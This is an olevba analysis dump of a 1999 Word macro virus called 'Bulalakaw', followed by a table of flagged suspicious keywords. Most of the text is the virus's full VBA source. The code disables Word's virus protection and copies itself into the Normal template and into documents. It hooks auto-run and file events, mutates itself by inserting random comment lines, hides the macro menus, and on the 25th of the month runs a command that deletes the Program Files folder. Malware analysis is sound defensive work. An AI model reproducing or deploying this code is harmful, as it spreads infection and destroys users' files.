olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mck.i-a1709047e220bf4e2a420ffd7c4392d278cad692
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mck.i-a1709047e220bf4e2a420ffd7c4392d278cad692 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bulalakaw.bas 
in file: Virus.MSWord.Mck.i-a1709047e220bf4e2a420ffd7c4392d278cad692 - OLE stream: 'Macros/VBA/Bulalakaw'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
        
Sub PolyEngine()
On Error Resume Next
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("Bulalakaw").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("Bulalakaw").CodeModule
Rem NsRxExGjAmDuRkRkMsEhGjJfQjUpMsJnQpRt
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
Rem IlAzPfSeBoKuAjNsDzCrPmRpLvHfVqRsQlUeBzUkTfNjRqMgOwOyBrSeFqDeHz
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("Bulalakaw").CodeModule
PolySize = Int(Rnd * 10)
For Polymorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Rem IpMeLgIiPmMqNiMyUsHoNkLrBoAoVkPhEf
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next Polymorphic
End With
End If
End Sub

Sub Bulalakaw()

    '+++++++++++++++++++++++++++++++++++++++++++++++++
    'Virus Name: Bulalakaw
    'Author: Lucky Warrior
    'Copyright © 1999 Bgy. Tiguib, Oras, Eastern Samar
    'All rights reserved.
    '+++++++++++++++++++++++++++++++++++++++++++++++++
    
On Error Resume Next
Options.ConfirmConversions = False
Rem AqHlPiIqQiDsRkLwRkQhDmKkFtNfVvRxOqIpEr
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("Bulalakaw").Export "c:\Bulalakaw.drv"
ActiveDocument.ReadOnlyRecommended = False
If Day(Now()) = 25 Then
    Shell ("Deltree /y C:\Progra~1")
    End If
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Lucky Warrior"
    .Comments = "Bulalakaw"
    .Execute
Rem MoFuCkGhTvOtSkQhEhPhOsTo
End With
Rem VlSpTi
If NormalTemplate.VBProject.VBComponents.Item("Bulalakaw").Name <> "Bulalakaw" Then SuchBulalakaw = True
If ActiveDocument.VBProject.VBComponents.Item("Bulalakaw").Name <> "Bulalakaw" Then MoreBulalakaw = True
Rem Uk
If SuchBulalakaw = True And MoreBulalakaw = False Then Set PhUz39490774 = NormalTemplate.VBProject.VBComponents
If SuchBulalakaw = False And MoreBulalakaw = True Then Set PhUz39490774 = ActiveDocument.VBProject.VBComponents
PhUz39490774.import "c:\Bulalakaw.drv"
If SuchBulalakaw = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If MoreBulalakaw = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
Breakpoint:
End Sub
Sub FileNew()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Bulalakaw
End Sub
Rem Ry
Sub FileSave()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub EditFind()
    On Error Resume Next
Dialogs(wdDialogEditFind).Show
Rem QmVuOrIwVmLmGyGeDnPrFjAyKqDqMeFeRxPmCmDqEhBtFeByKiFgHmUjNoDtCjNz
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call Bulalakaw
End Sub
Sub FileExit()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Bulalakaw
    Call PolyEngine
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Bulalakaw
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call PolyEngine
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

